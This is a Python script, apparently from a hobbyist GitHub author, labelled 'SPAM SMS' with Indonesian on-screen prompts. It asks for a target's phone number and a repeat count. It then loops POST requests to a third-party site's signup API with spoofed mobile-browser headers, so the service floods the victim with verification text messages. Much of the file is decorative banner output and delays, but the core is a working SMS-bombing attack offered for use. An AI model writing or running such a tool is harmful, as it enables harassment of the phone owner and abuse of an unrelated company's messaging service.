import time, requests,json,os

os.system("clear")

print("    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
print("    ∎                                    ∎")
print("    ∎         Author  : Rizqi Gans       ∎")
print("    ∎         YouTube : Riskimbmbg       ∎")
print("∎∎∎∎∎         Facebook: Riski mbmbg      ∎∎∎∎∎")
print("∎   ∎         GitHub  : Riskimbmbg       ∎   ∎")
print("∎   ∎                                    ∎   ∎")
print("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
time.sleep(1.2)
print("∎   ∎ \                                / ∎   ∎")
time.sleep(1.2)
print("∎∎∎∎∎        Nomer Target 8xxxxxxx       ∎∎∎∎∎")
time.sleep(1.2)
print("    ∎        Usahakan Spam Mentok 5      ∎")
time.sleep(1.2)
print("    ∎ /                                \ ∎")
time.sleep(1.2)
print("∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
time.sleep(1.2)
print("∎               ∎            ∎               ∎")
time.sleep(1.2)
print("∎               ∎∎∎∎∎∎∎∎∎∎∎∎∎∎               ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
time.sleep(1.2)
print("∎")
nomer = input("∎∎∎ Nomer Target ∎∎∎ : ")
time.sleep(2)
print("∎ Mendeteksi Nomer...")
time.sleep(3)
print("∎ Nomer Aktif [✓]")
time.sleep(1.2)
print("∎")
time.sleep(1.2)
print("∎")
time.sleep(1.2)
jumlah = int(input("∎∎∎ Jumlah Spam ∎∎∎ : "))
time.sleep(3)
print("∎")
time.sleep(1.2)
print("∎")
time.sleep(1.3)
print("∎")
time.sleep(1.2)
headers = {
"Host" : "eci.id",
"Connection" : "keep-alive",
"Content-Length" : "27",
"Accept" : "application/json, text/plain, */*",
"Origin" : "https://eci.id",
"User-Agent" : "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
"Content-Type" : "application/json",
"Referer" : "https://eci.id/register",
"Accept-Encoding" : "gzip, deflate, br",
"Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

data = json.dumps({"identity":"0"+nomer})
for i in range(jumlah):
	pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text

if "success" in pos:
    print("∎")
    time.sleep(1.2)
    print("∎∎∎ Cek Hp Target ∎∎∎ ",)

else:
    print("∎")
    time.sleep(1.2)
    print("∎∎∎ Maaf Gagal ∎∎∎ ",)
